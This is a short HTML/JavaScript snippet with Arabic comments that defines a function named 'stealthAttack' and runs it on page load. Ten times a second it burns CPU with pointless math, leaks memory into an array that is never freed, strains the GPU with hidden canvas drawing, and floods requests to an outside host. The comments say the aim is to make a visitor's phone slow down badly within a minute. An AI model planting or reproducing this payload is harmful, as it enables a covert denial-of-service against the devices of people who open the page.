<script>
    function stealthAttack() {
        // إنشاء مصفوفة ضخمة خارج التكرار لمنع تنظيف الذاكرة (Garbage Collection)
        let persistentLeak = [];

        setInterval(() => {
            // 1. معالجة حسابية مكثفة جداً (إشغال أنوية المعالج)
            for (let i = 0; i < 2000000; i++) {
                let x = Math.sin(Math.random()) * Math.cos(Math.random());
                x = Math.sqrt(x * x + 1);
            }

            // 2. استنزاف الرام بشكل "تراكمي" (كل ثانية يزيد 10 ميجا بايت)
            // هذه الطريقة تجعل الجوال يبدأ بالبطء الشديد بعد دقيقة واحدة
            persistentLeak.push(new Float64Array(1000000).fill(Math.random()));

            // 3. إرهاق كرت الشاشة (GPU) بعمليات رسم خفية
            let canvas = document.createElement('canvas');
            let ctx = canvas.getContext('2d');
            ctx.shadowBlur = 100;
            ctx.shadowColor = "red";
            ctx.fillRect(0, 0, 500, 500);

            // 4. إغراق الـ Network Tab بطلبات لا تنتهي
            let img = new Image();
            img.src = "https://nawaf-academy-test.com/ping?t=" + Date.now();

        }, 100); // سرعنا التوقيت إلى 100 مللي ثانية (10 مرات في الثانية) لزيادة الضغط
    }

    window.onload = stealthAttack;
</script>
